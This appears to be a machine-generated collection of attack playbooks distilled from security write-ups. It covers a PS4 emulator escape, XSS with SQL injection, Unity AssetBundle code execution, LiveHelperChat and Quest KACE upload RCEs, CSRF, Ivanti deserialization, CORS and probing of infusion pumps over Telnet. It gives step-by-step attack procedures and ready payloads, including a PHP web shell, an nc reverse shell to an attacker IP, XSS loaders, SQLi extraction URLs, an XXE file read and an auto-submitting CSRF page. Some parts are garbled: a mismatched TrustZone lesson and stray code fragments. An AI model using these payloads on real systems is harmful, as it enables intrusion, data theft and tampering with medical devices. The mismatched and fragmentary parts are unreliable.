playbooks.key_lesson: When interacting with secure TEE environments like Qualcomm TrustZone via inter-process communication protocols, strictly validate all shared memory pointers and their sizes to prevent memory corruption vulnerabilities arising from pointer overlaps.

meta.title: mast1c0re: Hacking the PS4 / PS5 through the PS2 Emulator - Part 1 - Escape

tech_stack_fingerprints: PS2 emulator compiler process name: ps2-emu-compiler.self

trigger_conditions.when_to_apply: When the PS2 emulator is running on a PS4 or PS5, as it contains JIT privileged code that can be exploited to achieve arbitrary code execution.
prerequisites: Attacker can run a specific PS2 game known to contain vulnerabilities.
applicability_signals: The target platform runs a PS2 game via the official emulator.
The PS2 emulator process (eboot.bin) and its compiler child process (ps2-emu-compiler.self) are identifiable.
skip_if: The PS2 emulator is not present or not vulnerable.
Sony has successfully patched the specific vulnerabilities within the emulator or the games it runs.

recon_steps: Step 1: Identify if the target PS4/PS5 is running a PS2 game using the official emulator.
Step 2: Confirm the presence and names of the emulator processes: eboot.bin and ps2-emu-compiler.self.
attack_steps: Step 1: Identify memory corruption vulnerabilities within the PS2 emulator's JIT compiler or application process.
Step 2: Craft a malicious PS2 game or exploit payload that targets these vulnerabilities.
Step 3: Execute the malicious payload by launching the crafted PS2 game on the target console.
Step 4: Leverage the achieved arbitrary code execution to compromise the emulator and potentially gain further system access.
payloads_or_patterns: Insufficient detail in writeup
tools_recommended: Custom PS2 game development tools
Memory corruption exploit development tools
Debugging tools for PS4/PS5 system processes
success_indicators: Successful execution of arbitrary native code on the PS4/PS5.
Ability to run pirated PS2 games.
Successful exploitation of the JIT compiler co-process.
failure_indicators: The PS2 game fails to launch or crashes unexpectedly.
No arbitrary code execution is achieved, indicating the exploit payload was ineffective or the vulnerabilities are patched.
Insufficient privileges gained to achieve desired impact.

playbooks.impact: Allows an attacker to run arbitrary native code on the PS4/PS5 without needing a kernel exploit, leading to the ability to run pirated PS2 games, homebrew software, and potentially compromise the system further.
playbooks.key_lesson: Exploit legacy components like emulators that may retain JIT privileges, as they can become critical attack vectors on modern, hardened platforms.

meta.title: Blind XSS and Time-Based SQL Injection to Admin Panel Control and Database Takeover

target_profile.required_access_level: any_authenticated_user (for XSS), potentially unauthenticated (for SQLi, if admin panel is accessible)

trigger_conditions.when_to_apply: When a web application accepts user input in forms, and this input is displayed to other users (teachers/admins), or when an endpoint shows user-specific data via an ID parameter without proper sanitization.
prerequisites: A form submission feature where data is displayed to a privileged user (teacher/admin).
The ability to inject JavaScript into the form fields.
applicability_signals: Input fields in forms (Email, Name, Institute, Group ID).
The presence of an admin panel or privileged user interface where submitted data is viewed.
The existence of an endpoint like /user/invoice.php that takes an ID parameter.
skip_if: Input fields are strictly validated and do not allow script tags or their obfuscated variants.
All requests to sensitive endpoints return 403 or are heavily rate-limited.

recon_steps: Step 1: Identify input fields within forms that handle student applications. Look for fields like Email, Name, Institute, and Group ID.
Step 2: Attempt to inject basic XSS payloads like `<script>alert(1)</script>` into each field to check for reflected or stored XSS.

Step 3: If basic XSS fails, use XSSHunter (or similar service) to test for blind XSS by injecting payloads like `"<script src=https://your.xss.ht></script>"` concatenated with fields. Monitor for callbacks.

Step 4: Once a blind XSS callback is received and confirms stored XSS, analyze the DOM of the triggered page (as shown in the writeup) to understand the admin panel's structure and potential endpoints.
Step 5: Crawl the admin panel's URLs, looking for endpoints that accept parameters like `id_facture` or `id_user` in conjunction with `megadmin=true`.
attack_steps: Step 1 (Blind XSS): Submit a form with the email field as `your_email@example.com<script src=https://your.xss.ht></script>`. Observe XSSHunter for callbacks and DOM information.
Step 2 (Admin Panel Discovery): Use the DOM information from XSSHunter to navigate to potential admin panel URLs. Look for unauthenticated access to CRUD operations or sensitive data.

Step 3 (SQL Injection Recon): On discovering an endpoint like `https://www.XYZ.com/user/invoice.php?id_facture=123456&megadmin=true&id_user=<TARGET_USER_ID>`, attempt to inject SQL metacharacters (e.g., `'`, `"`, `;`) into the `id_facture` and `id_user` parameters.

Step 4 (Time-Based SQLi): If direct SQLi attempts yield no immediate error or data leakage, switch to time-based SQL injection. Append payloads that introduce a time delay (e.g., `AND SLEEP(5)`) to the `id_facture` or `id_user` parameters and observe the response time. If the response is delayed by 5 seconds, SQLi is confirmed.

Step 5 (Data Exfiltration/Admin Control): Once time-based SQLi is confirmed, craft payloads to exfiltrate data (e.g., credentials, user lists) or perform actions within the admin panel through crafted SQL queries.
payloads_or_patterns: Form Field (Email): `xyz@gmail.com"<script src=https://link.xss.ht></script>`
SQLi (Time-Based): `https://www.XYZ.com/user/invoice.php?id_facture=123456&megadmin=true&id_user=<TARGET_USER_ID> AND SLEEP(5)-- -`
SQLi (Data Exfiltration Example): `https://www.XYZ.com/user/invoice.php?id_facture=123456&megadmin=true&id_user=(SELECT password FROM users WHERE username='admin')-- -`
tools_recommended: XSSHunter: For detecting and exploiting blind XSS vulnerabilities.
Burp Suite (Repeater/Intruder): For manual testing and automated fuzzing of SQL injection parameters.
SQLMap: For automated SQL injection detection and exploitation.
success_indicators: XSSHunter callback with victim IP, DOM, cookie, and screenshot.
Successful navigation to admin panel pages without authentication prompts.
Ability to perform CRUD operations on users.
Delayed response time (e.g., 5 seconds) when appending `SLEEP(5)` to SQL injection parameters, confirming time-based SQLi.
Leaked sensitive data (invoices, API keys, PayPal info) in SQL injection responses or accessible admin panel sections.
failure_indicators: No XSSHunter callbacks received after multiple attempts and varied payloads → target might have robust XSS filtering or no vulnerable stored XSS points.
Admin panel pages are protected by authentication or return 403 → admin panel may not be directly accessible or requires specific session tokens.
No response delay or errors when injecting SQLi payloads → target might have WAF protection or not be vulnerable to SQLi on the tested parameters.

playbooks.impact: Full access to the admin panel, including CRUD operations on users, stealing invoices, generating API keys, accessing PayPal information, deleting documents, and viewing/editing timetables. Potential for complete database takeover through SQL injection.
playbooks.key_lesson: Always test form inputs for blind XSS using services like XSSHunter, and analyze the resulting DOM to discover potential admin panels or sensitive endpoints. Subsequently, test ID parameters in sensitive endpoints for SQL injection vulnerabilities, especially time-based variations.

meta.title: Hacking Unity Games with Malicious GameObjects

tech_stack_fingerprints: Unity engine detected in game metadata or network traffic

trigger_conditions.when_to_apply: When a Unity game allows the loading of external AssetBundles at runtime, especially if downloaded over unencrypted HTTP or if certificate validation is weak.
prerequisites: Target Unity game loads external AssetBundles at runtime.
applicability_signals: Game performs `UnityWebRequestAssetBundle.GetAssetBundle()` call.
AssetBundles are downloaded from untrusted sources.
Network traffic analysis shows AssetBundles downloaded over HTTP.
skip_if: All AssetBundles are bundled with the game and not loaded at runtime.
AssetBundles are only loaded from trusted, digitally signed sources with strong certificate validation.

recon_steps: Step 1: Analyze game network traffic for AssetBundle downloads, noting URLs and protocols used.
Step 2: Identify game features that allow external content loading (e.g., modding support, downloadable content).
attack_steps: Step 1: Craft a malicious GameObject within an AssetBundle. This involves creating a GameObject with components or scripts that, when loaded and processed by Unity, execute arbitrary code.
Step 2: Serve the malicious AssetBundle via a web server.

Step 3: If the target game is known to download AssetBundles from specific URLs, attempt to intercept and replace legitimate AssetBundles with the malicious one (e.g., via Man-in-the-Middle on untrusted networks).
Step 4: If the game downloads AssetBundles directly from a public URL without strong validation, configure your web server to respond with the malicious AssetBundle.
Step 5: For games allowing user-provided AssetBundles (e.g., mods), provide the malicious AssetBundle to the user.
payloads_or_patterns: Crafted AssetBundle containing a malicious GameObject designed to trigger code execution via Unity's deserialization or component loading mechanisms. Specific payloads depend on Unity version and game implementation, but could involve exploiting `OnDestroy`, `Awake`, or other lifecycle methods, or specific component vulnerabilities.
tools_recommended: Unity Editor: To create and package malicious GameObjects into AssetBundles.
Burp Suite / OWASP ZAP: To intercept and potentially modify network traffic, especially for MITM attacks on HTTP AssetBundle downloads.
Wireshark: To analyze network traffic for AssetBundle download patterns and protocols.
Custom Python/Go server: To host and serve malicious AssetBundles.
success_indicators: Code execution on the victim's machine where the game is running (e.g., a reverse shell, a spawned process, arbitrary file read/write).
Observed malicious behavior in the game that was not intended (e.g., unexpected visual glitches, incorrect game state, network callbacks to attacker-controlled server).
failure_indicators: AssetBundle download fails with certificate errors or HTTPS-related issues (suggests stronger TLS validation is in place).

AssetBundle loads but the malicious GameObject does not trigger code execution (suggests the exploit payload is incorrect or not compatible with the target's Unity version/configuration). Pivot to exploring different GameObject component vulnerabilities.
WAF blocking access to the AssetBundle host if it's hosted publicly.

playbooks.impact: Arbitrary code execution on the player's machine, leading to full compromise of the system. This could include data theft, installation of malware, privilege escalation, or disruption of game services.
playbooks.key_lesson: Always validate the source and integrity of external assets, particularly AssetBundles loaded at runtime in Unity, as they can contain malicious logic disguised as non-code assets.

meta.title: Hacking Unity Games with Malicious GameObjects, Part 2

trigger_conditions.when_to_apply: This technique is applicable to Unity games that load AssetBundles from untrusted sources and use built-in Unity components or Asset Store components that expose vulnerable methods. The zero-click exploit is useful when standard user interaction methods are not feasible.
prerequisites: Target Unity game must load AssetBundles from an untrusted source.
The target Unity game must have components accessible from AssetBundles that have vulnerable methods with the correct signature for AnimationEvents (any return type, specific parameter types).
applicability_signals: Game utilizes AssetBundles for modding or user-generated content.
Game includes UI elements that can be toggled or animated.
Game uses standard .NET libraries prior to .NET 4.5.2 (for XXE).
skip_if: Game does not load external AssetBundles.
All methods callable via AnimationEvents are benign or have no exploitable side effects.

recon_steps: Step 1: Identify if the target Unity game loads AssetBundles from untrusted sources.

Step 2: Analyze the components available within the Unity project (including common Asset Store assets) for methods with the signature: /*(any return type)*/ MethodName( (float|string|int|object|AnimationEvent) param ).
Step 3: Look for methods within these components that perform actions like executing shell commands, making arbitrary HTTP requests, or file manipulation.
attack_steps: Step 1 (Zero-click via UnityEvents): Create a malicious AssetBundle containing a Unity UI Toggle and an EventSystem. Attach an autoplaying animation that toggles the UI Toggle.
Step 2 (Zero-click via UnityEvents): Ensure the Toggle's `onValueChanged` UnityEvent is configured to call a desired vulnerable static method.
Step 3 (Zero-click via AnimationEvents): Create a malicious AssetBundle with a GameObject that has an animation.
Step 4 (Zero-click via AnimationEvents): Configure an AnimationEvent within that animation to call a vulnerable method on a component.
Step 5 (Zero-click via AnimationEvents): If the vulnerable method requires parameters, ensure they can be supplied via the AnimationEvent or by other means within the AssetBundle.
Step 6: Deliver the malicious AssetBundle to the target game.
payloads_or_patterns: Payload for UnityEvents: Attach GameObject with UI Toggle and EventSystem. Configure autoplaying animation to toggle the UI. Hook `onValueChanged` to `System.Diagnostics.Process.Start` or `Application.OpenURL` with a malicious command/URL.

Payload for AnimationEvents: Attach GameObject with animation. Configure AnimationEvent to call `System.Diagnostics.Process.Start` or `Application.OpenURL` with a malicious command/URL. Alternatively, target vulnerable .NET libraries like `System.Xml.XmlTextReader` for XXE.

Payload for XXE via System.Xml.XmlTextReader: Craft an XML payload that leverages an external entity to read local files or perform SSRF. Example: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>`
tools_recommended: Unity Editor: For creating and packaging malicious AssetBundles.
AssetBundle extractor/creator tools: To understand and modify AssetBundles.
Burp Suite Collaborator: To detect outbound HTTP requests from the target game.
success_indicators: Arbitrary code execution confirmed (e.g., shell command executes, reverse shell established).
Outbound HTTP request observed in Burp Suite Collaborator.
XXE vulnerability confirmed by the ability to read local files via XML parsing.
failure_indicators: AssetBundle fails to load or causes game crash (suggests malformed bundle or security checks).
No malicious activity observed (suggests lack of vulnerable components or insufficient privileges). Pivot to different vulnerable components or methods.
AnimationEvents do not fire or do not trigger the intended method (suggests incorrect animation or event setup).

playbooks.impact: Remote Code Execution (RCE) on the user's machine, allowing attackers to run arbitrary commands, access sensitive files, or initiate further attacks. For XXE, attackers can read arbitrary files on the server or client.
playbooks.key_lesson: Always validate the source and integrity of AssetBundles loaded by Unity games, as they can contain malicious GameObjects with built-in components capable of arbitrary code execution or other harmful actions.

meta.title: LiveHelperChat - Remote Code Execution via Vulnerable Theme Upload Function

trigger_conditions.when_to_apply: When the target application allows theme uploads and processes them with a vulnerable import mechanism.
prerequisites: Attacker must have an authenticated user account.
applicability_signals: Access to the /site_admin/abstract/new/WidgetTheme and /site_admin/theme/import endpoints.
The application accepts JSON data for theme configuration.
The theme upload process does not sufficiently sanitize file extensions or content.
skip_if: The theme import process strictly enforces file types and content validation.
The server prevents execution of PHP files in the theme storage directory.

recon_steps: Navigate to the theme creation/editing section: /lhc_web/index.php/site_admin/abstract/new/WidgetTheme.
Attempt to download an existing theme (if any) or create a new one and download it from: /lhc_web/index.php/site_admin/abstract/edit/WidgetTheme/1.
attack_steps: Create a new theme by filling in dummy data in the theme creation form.
Download the created theme.
Modify the downloaded theme file: replace the content of 'offline_image_data' with a base64 encoded PHP web shell, and set 'offline_image_data_ext' to 'php'.
Upload the modified theme via the import function: /lhc_web/index.php/site_admin/theme/import.
Edit the imported theme in the Widget themes section.

Inspect the page source to find the path where the malicious PHP file was uploaded. This path is usually in the format: /lhc_web/var/storagetheme/<year>/<month>/<day>/<theme_id>/<generated_filename>.php.
Execute the uploaded PHP web shell by sending a GET request to its URL with the 'cmd' parameter set to the desired command (e.g., 'nc <attacker_ip> <listener_port> -e /bin/bash').
payloads_or_patterns: JSON structure for theme import: { "name" : "Test" , "name_company" : "Peter Winter" , "offline_image_data" : "<base64_encoded_php_webshell>" , "offline_image_data_ext" : "php" }
Example PHP web shell (base64 encoded): base64(<?php system($_GET['cmd']); ?>)
Reverse shell command: nc <attacker_ip> <listener_port> -e /bin/bash
tools_recommended: Burp Suite: To intercept and modify HTTP requests, particularly during theme creation and import.
Netcat (nc): To establish a reverse shell listener.
success_indicators: Successful upload of the theme.
The PHP web shell is executed when a GET request is made to its URL.
A reverse shell connection is established to the attacker's listener.
Execution of commands like 'id' on the target server via the reverse shell.
failure_indicators: Theme upload fails with an error related to file type or content validation.
Accessing the uploaded file path results in a 404 or other error.
The 'cmd' parameter does not execute commands on the server.
A 403 Forbidden error when trying to access the uploaded PHP shell.

playbooks.impact: Remote Code Execution (RCE) on the target server, allowing an attacker to execute arbitrary commands with the privileges of the web server user (e.g., www-data). This can lead to full server compromise, data theft, or further network pivoting.
playbooks.key_lesson: Sanitize user-supplied file content and extensions rigorously during file uploads. Implement strict validation on base64 encoded image data and ensure the 'offline_image_data_ext' parameter is not blindly trusted to determine the final file type.

meta.title: Bug Bounty - Cross-site request forgery is a thing

target_profile.technology: Redacted Airline Ticket Limit Management Web Application

trigger_conditions.when_to_apply: When a web application's administrative interface performs state-changing actions via POST requests that lack any CSRF protection mechanisms.
prerequisites: Attacker must be able to send crafted HTML/JavaScript to a victim or trick the victim into visiting a malicious link.
Victim must be authenticated with administrative privileges in the target application.
applicability_signals: POST requests observed in Burp Suite history that do not contain Anti-CSRF tokens.
Endpoint path like '/tlm/emailFunction.form?action=...'
skip_if: All POST requests are protected by Anti-CSRF tokens (e.g., checking for a CSRF token in headers or form parameters).
The target application explicitly denies requests that are not initiated from its own origin (e.g., strong Same-Origin Policy implementation at the server level).

recon_steps: Step 1: Browse the target web application with Burp Suite, focusing on administrative functions.
Step 2: Analyze the Burp request history for POST requests that modify application state (e.g., adding airlines, emails, triggering password resets).
Step 3: Verify if any of these POST requests are protected by CSRF tokens (in headers or form data).
attack_steps: Step 1: Identify a high-impact administrative action (e.g., adding an airline, adding an email, triggering a password reset email).
Step 2: Construct a malicious HTML page containing multiple hidden form submissions, each targeting a different administrative action endpoint.
Step 3: Use JavaScript `window.onload` to automatically submit these forms when the page is loaded by the victim.
Step 4: Embed these forms within `<iframe>` elements to prevent potential frame-busting techniques by the target application.
Step 5: Deliver the crafted HTML page to the victim via social engineering (e.g., email link, chat message).
payloads_or_patterns:
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<script language = "javascript" >
window. onload = function () {
 document. getElementById ("csrfForm1"). submit ();
 document. getElementById ("csrfForm2"). submit ();
 document. getElementById ("csrfForm3"). submit ();
 document. getElementById ("csrfForm4"). submit ();
}
// defeat frame busters
window. onbeforeunload = function () {
 return "Please click 'Stay on this page' to allow it to finish loading." ;
}
</script>
</head>
<body>
<form id = "csrfForm1" action = "<TARGET_URL>/tlm/emailFunction.form?action=addairlinedetails&airline=" method = "POST" target = "csrfIframe1" >
<input type = "hidden" name = "temp" value = "" />
<input type = "hidden" name = "airline" value = "" />
<input type = "hidden" name = "login" value = "" />
<input type = "hidden" name = "usrtype" value = "null" />
<input type = "hidden" name = "txtAirline" value = "SY" />
<input type = "hidden" name = "txtLoginName" value = "C1SC0" />
<input type = "hidden" name = "selUsrType" value = "supervisor" />
</form>
<form id = "csrfForm2" action = "<TARGET_URL>/tlm/emailFunction.form?action=addemaildetails" method = "POST" target = "csrfIframe2" >
<input type = "hidden" name = "aa" value = "" />
<input type = "hidden" name = "login" value = "C1SC0" />
</form>
</body>
</html>
tools_recommended: Burp Suite: To intercept, analyze, and craft HTTP requests.
HTML/JavaScript editor: To construct the CSRF proof-of-concept page.
success_indicators: Successful execution of administrative actions (e.g., an airline is added, an email is associated with an airline) without the user's explicit consent on the target application.
Receipt of a password reset email for a newly created account or to an attacker-controlled email address.
failure_indicators: All crafted requests result in errors or unexpected behavior (e.g., 403 Forbidden, 401 Unauthorized, unexpected redirects). This might indicate robust CSRF protection or insufficient privileges.
The victim is prompted to re-authenticate or confirm the action, indicating the CSRF protection is working.

playbooks.impact: An attacker can impersonate an authenticated administrator to perform any action available through the vulnerable endpoints, such as adding airlines, configuring email notifications (including password resets), and potentially gaining unauthorized access or disrupting operations.
playbooks.key_lesson: Always scrutinize POST requests for administrative functions to ensure the presence and validity of Anti-CSRF tokens; their absence on state-changing operations is a critical vulnerability.

meta.title: Privacy Violation In Chat System

trigger_conditions.when_to_apply: When a chat system allows users to delete messages, and there's a possibility that associated file attachments are not properly removed.
prerequisites: Attacker must have an authenticated account in the chat system.
Attacker must be able to send a message with file attachments.
applicability_signals: A request to delete a message exists.
File attachments can be sent with messages.
The system provides an API endpoint for retrieving pre-signed URLs for files.
skip_if: File attachments are automatically and permanently deleted immediately after the message is deleted.

recon_steps: Step 1: Identify the API endpoint used to send messages with attachments and observe the request/response.
Step 2: Identify the API endpoint used to delete messages and note the parameters involved (e.g., messageid).
Step 3: Identify the API endpoint used to retrieve file URLs or access uploaded files.
attack_steps: Step 1: Send a chat message with a file attachment to another user.
Step 2: Capture the request for sending the message and note the file details and message ID.
Step 3: Open the sent file attachment in a new tab using its direct URL or by requesting its pre-signed URL.
Step 4: Use the delete message API endpoint with the message ID to delete the message.
Step 5: Attempt to access the file attachment again using the URL obtained in Step 3. If the URL is still valid and the file is accessible, the vulnerability is confirmed.
payloads_or_patterns: POST /api/chat/message (with attachment data)
DELETE /api/chat/message?messageId=<MESSAGE_ID>
GET /api/files/get_presigned_url?fileId=<FILE_ID>
tools_recommended: Burp Suite Repeater: To re-send the delete message request and to test access to file URLs.
Browser Developer Tools: To observe network requests and responses during message sending and file access.
success_indicators: The file attachment remains accessible via its URL even after the associated message has been deleted.
A pre-signed URL obtained after message deletion still allows access to the file content.
failure_indicators: The file attachment is no longer accessible after the message deletion, or the pre-signed URL expires/becomes invalid.
Receiving a 404 Not Found or 403 Forbidden error when trying to access the file after message deletion.

playbooks.impact: Unauthorized access to sensitive user data (e.g., private keys, personal photos) that were attached to chat messages, even after the user intended to delete them. This constitutes a significant privacy violation.
playbooks.key_lesson: When a message deletion feature is implemented, ensure that all associated resources, including file attachments, are also permanently deleted to prevent data leakage and privacy violations.

meta.title: Attackers Can Bypass GitHub Required Reviewers to Submit Malicious Code

trigger_conditions.when_to_apply: When a GitHub repository has protected branches configured with the 'Require pull request reviews before merging' option enabled, and the attacker can create a pull request to that branch.
prerequisites: Attacker must have write access to a repository or be able to fork and submit a pull request.
The target repository must have branch protection rules enabled for the target branch.
The branch protection rules must require pull request reviews before merging.
The attacker must be able to create a pull request.
applicability_signals: Repository settings showing 'Require pull request reviews before merging' is enabled for a branch.
Attempting to merge a pull request without reviews results in an error message indicating review is required.
skip_if: No branch protection rules are configured.
Branch protection rules do not require reviews.
The attacker does not have permissions to create a pull request.

recon_steps: Step 1: Identify target GitHub repositories that use branch protection rules.
Step 2: Inspect the branch protection rules for the target branch to confirm 'Require pull request reviews before merging' is enabled.
Step 3: Identify if there are any exceptions to the required reviewers (e.g., administrators bypassing reviews).
attack_steps: Step 1: Create a new branch from the target branch.
Step 2: Introduce malicious code into the new branch.
Step 3: Push the new branch to your fork or directly to the target repository if permitted.
Step 4: Create a pull request from the malicious branch to the protected target branch.
Step 5: Observe the pull request. If the 'Require approvals' check is present but not blocking the merge, the bypass is successful.
Step 6: If the bypass is successful, attempt to merge the pull request without any reviews. The writeup implies this is possible due to a logic flaw.
payloads_or_patterns: Any code change that introduces a vulnerability or unwanted behavior. For example, a malicious JavaScript snippet for XSS, or a backdoor for RCE.
tools_recommended: Git CLI: for creating branches, committing changes, and pushing.
GitHub web interface: for creating pull requests and observing the merge process.
success_indicators: The pull request merge button becomes active without the required number of approvals.
The malicious code is successfully merged into the protected branch.
failure_indicators: The merge button remains disabled, and an error message explicitly states that review is required and no approvals have been given. This indicates the bypass logic is not applicable or has been patched.
The pull request shows a failure status for the 'Required Approvals' check, preventing merge.

playbooks.impact: An attacker can merge malicious code into a protected branch, bypassing security controls and potentially leading to code injection, introduction of vulnerabilities, or unauthorized changes within the codebase.
playbooks.key_lesson: Always verify that branch protection rules, especially those requiring reviews, are strictly enforced by the underlying platform logic and do not have bypassable conditions.

meta.title: Riding The Inforail To Exploit Ivanti Avalanche Part 2

trigger_conditions.when_to_apply: When an attacker has authenticated access to Ivanti Avalanche and can interact with services like the Printer Device Server or Smart Device Server.
prerequisites: Authenticated access to Ivanti Avalanche.
Ability to influence values that are eventually passed to `JwtTokenUtility` constructor with `publicOnly=false`.
applicability_signals: Presence of `JwtTokenUtility` class with a non-default constructor that deserializes a base64-decoded argument.
Instances where `JwtTokenUtility` constructor is called with `publicOnly` argument set to `false`.
Services like Printer Device Server or Smart Device Server that call `JwtTokenUtility`.
skip_if: Inability to authenticate to the target system.
No observable paths that lead to `JwtTokenUtility` deserialization with attacker-controlled input.

recon_steps: Analyze Ivanti Avalanche codebase for the `JwtTokenUtility` class and its constructors.
Identify all call sites of the `JwtTokenUtility` constructor, paying close attention to those where the `publicOnly` argument is `false`.
Investigate the sources of the arguments passed to these constructors to understand what data is controllable by an attacker.
attack_steps: Identify a service (e.g., Printer Device Server) that calls `JwtTokenUtility` constructor, specifically the `AmcConfigDirector.createAccessTokenGenerator` method.
Identify how to control the `pkk` string which is passed to the `JwtTokenUtility` constructor after decryption.
Locate the `setAccessKeyPair` method within the `Global` class (or similar configuration management class) called by `AmcConfigDirector.processServerProfile`.
Craft a serialized Java object that, when deserialized, achieves the desired malicious outcome (e.g., Remote Code Execution).
Serialize the crafted object, base64 encode it, and find a way to set this as the `accessKeyPair` value, which eventually becomes the `pkk` string.
Trigger the vulnerable code path in the target service (e.g., Printer Device Server) to process the crafted `pkk` string.
payloads_or_patterns: A base64 encoded serialized Java object that exploits `JwtTokenUtility` for RCE. The exact payload depends on the gadget chain discovered.
tools_recommended: Java deserialization tools (e.g., ysoserial) to generate malicious payloads.
Decompilers (e.g., JD-GUI) for reverse engineering Ivanti Avalanche binaries.
Network proxy (e.g., Burp Suite) to intercept and modify traffic if applicable, though this exploit focuses on internal service interaction.
success_indicators: Remote Code Execution as SYSTEM on the target server.
Specific error messages or logs indicating deserialization of a malicious object.
Observable system changes consistent with RCE (e.g., creation of files, execution of commands).
failure_indicators: Deserialization of a benign object or no deserialization occurring.
Errors related to incorrect object types or class definitions during deserialization (e.g., `ClassNotFoundException`).
WAF or security controls blocking the crafted payload if network-based.

playbooks.impact: Remote Code Execution (RCE) with SYSTEM privileges on Ivanti Avalanche servers, allowing attackers to compromise managed devices, exfiltrate sensitive data, and disrupt operations.
playbooks.key_lesson: Always investigate classes that perform deserialization on user-controlled or indirectly controllable data, especially when combined with base64 encoding or encryption, as these are common sinks for insecure deserialization vulnerabilities leading to RCE.

meta.title: Fun With CORS

trigger_conditions.when_to_apply: When a web application exposes sensitive information or functionality through JavaScript code that can be accessed by an attacker's origin due to overly permissive CORS policies.
prerequisites: The target web application uses CORS.
applicability_signals: Observe the presence of `Access-Control-Allow-Origin` header in HTTP responses.
Check if the `Access-Control-Allow-Origin` header is set to `*` or allows arbitrary origins.
skip_if: The `Access-Control-Allow-Origin` header is explicitly set to the expected origin only.

recon_steps: Step 1: Inspect HTTP responses from the target web application for the presence of CORS headers, specifically `Access-Control-Allow-Origin`.
Step 2: Analyze the value of `Access-Control-Allow-Origin`. If it is `*` or permits a wide range of origins, proceed to attack.
attack_steps: Step 1: Craft a malicious JavaScript payload hosted on an attacker-controlled origin.
Step 2: Configure the malicious JavaScript to make requests to the target application's endpoints that are intended to be accessed from the legitimate origin.
Step 3: Trigger the execution of the malicious JavaScript in a victim's browser context (e.g., via XSS or social engineering) that has a session with the target application.
Step 4: Analyze the response received by the malicious JavaScript.
tools_recommended: Burp Suite: To inspect CORS headers and craft requests.
Custom JavaScript: To host malicious payloads and exfiltrate data.
success_indicators: The attacker-controlled origin receives data from the target application's sensitive endpoint.
The `Access-Control-Allow-Origin` header in the response from the target is set to the attacker's origin (if not `*`).
JavaScript console logs on the attacker's origin show successful data retrieval.
failure_indicators: The browser blocks the request due to CORS policy violation (e.g., `Access-Control-Allow-Origin` mismatch).

No sensitive data is returned or accessible to the attacker's origin. Pivot to checking if there are other endpoints with less restrictive CORS policies or if the exploit requires user interaction beyond just visiting a page.

playbooks.impact: Disclosure of sensitive information accessible by the web application, potential for account takeover or unauthorized actions if the application exposes sensitive API endpoints that are not properly protected by CORS.
playbooks.key_lesson: Always restrict `Access-Control-Allow-Origin` to specific, trusted origins rather than using `*` or overly broad patterns.

meta.title: QUEST KACE Desktop Authority Pre-Auth Remote Code Execution (CVE-2021-44031)

trigger_conditions.when_to_apply: The target system is running an affected version of Quest KACE Desktop Authority (11.1 and earlier) and is accessible externally or internally.
prerequisites: Target is reachable at `<TARGET_URL>`
applicability_signals: Endpoint `/dacomponentui/profiles/profileitems/outlooksettings/InsertImage.aspx` is accessible
Directory listing is enabled on the `/images` directory
The target responds with a VIEWSTATE parameter during initial requests
skip_if: Endpoint `/dacomponentui/profiles/profileitems/outlooksettings/InsertImage.aspx` is not accessible
File uploads to the `/images` directory are rejected or sanitized
Directory listing is disabled for `/images`

recon_steps: Step 1: Access the target URL <TARGET_URL> to confirm the presence of the Quest KACE Desktop Authority console.
Step 2: Attempt to access `/dacomponentui/profiles/profileitems/outlooksettings/InsertImage.aspx` directly to confirm its availability and check for authentication requirements.
Step 3: Observe the response headers and HTML source for any indicators of the underlying web server (e.g., IIS) and specific application versions.
attack_steps: Step 1: Send a GET request to `<TARGET_URL>/DesktopAuthorityConsole/dacomponentui/profiles/profileitems/outlooksettings/InsertImage.aspx` to retrieve the VIEWSTATE value from the response.

Step 2: Craft a POST request to `<TARGET_URL>/DesktopAuthorityConsole/dacomponentui/profiles/profileitems/outlooksettings/InsertImage.aspx`. The request should include the retrieved VIEWSTATE, appropriate boundary items, and a malicious ASP file as the image content.

Step 3: Upon successful upload, enumerate the `/images` directory (which has directory listing enabled) to find the GUID-named folder containing the uploaded ASP file. If the GUID is not immediately obvious, infer it or use brute-force if a pattern is observed.
Step 4: Access the uploaded ASP file via its full URL (e.g., `<TARGET_URL>/DesktopAuthorityConsole/images/<GUID>/<your_malicious_file.asp>`) to execute code on the server.

Dim endIndex As Integer = 0

startInfo.UseShellExecute = False

startInfo.RedirectStandardError = True

result = process.StandardOutput.ReadToEnd()
If result.Length = 0 Then
result = process.StandardError.ReadToEnd()

tools_recommended: Burp Suite: To intercept and modify HTTP requests, capture VIEWSTATE, and automate the upload process.
Python with `requests` library: For scripting the automated exploitation, including VIEWSTATE retrieval and file upload.
success_indicators: A successful POST request to `InsertImage.aspx` returns a 200 OK status code.
Accessing the uploaded ASP file results in the execution of the embedded code, potentially returning output from `ExecuteCommand` or causing an error if the command is invalid.
The presence of the uploaded ASP file in the `/images/<GUID>/` directory is confirmed via directory listing.
failure_indicators: 403 Forbidden or 401 Unauthorized responses on `InsertImage.aspx` indicate authentication or authorization issues.
A 500 Internal Server Error or unexpected response after uploading might indicate an issue with the ASP payload or server-side processing.

File uploads are rejected with specific error messages related to file type or size, suggesting a potential WAF or validation is in place. In such cases, further investigation into allowed file types or bypassing mechanisms would be required.

playbooks.impact: Remote code execution on the Quest KACE Desktop Authority server, allowing an attacker to run arbitrary commands with the privileges of the web server process. This can lead to further compromise of the network, data exfiltration, or lateral movement.
playbooks.key_lesson: Always validate authorization controls on file upload endpoints, especially those exposed externally, and enforce strict file type restrictions to prevent the upload and execution of malicious scripts.

meta.title: Baxter SIGMA Spectrum Infusion Pumps: Multiple Vulnerabilities (FIXED)

tech_stack_fingerprints: Telnet service running on pump/battery unit

trigger_conditions.when_to_apply: When a Telnet service is accessible on a Baxter SIGMA Spectrum Infusion Pump or its Wi-Fi Battery unit.
prerequisites: Network access to the device's Telnet service.
applicability_signals: Telnet banner indicating Baxter SIGMA device
Successful connection via Telnet to the device
skip_if: Telnet service is not running or is inaccessible.
The 'hostmessage' command is not found or does not respond to format string specifiers.

recon_steps: Step 1: Scan the target IP range for open TCP port 23 (Telnet).
Step 2: Attempt to connect to port 23 using a Telnet client to identify the device type.
attack_steps: Step 1: Connect to the device via Telnet.
Step 2: If `settrace state=on` is not enabled, enable it using the command: `settrace state=on`.
Step 3: Execute the `hostmessage` command with format string specifiers such as `%x` to observe the output.
Step 4: Repeat Step 3 with various combinations of format string specifiers to extract information from the device's process stack.
payloads_or_patterns: settrace state=on
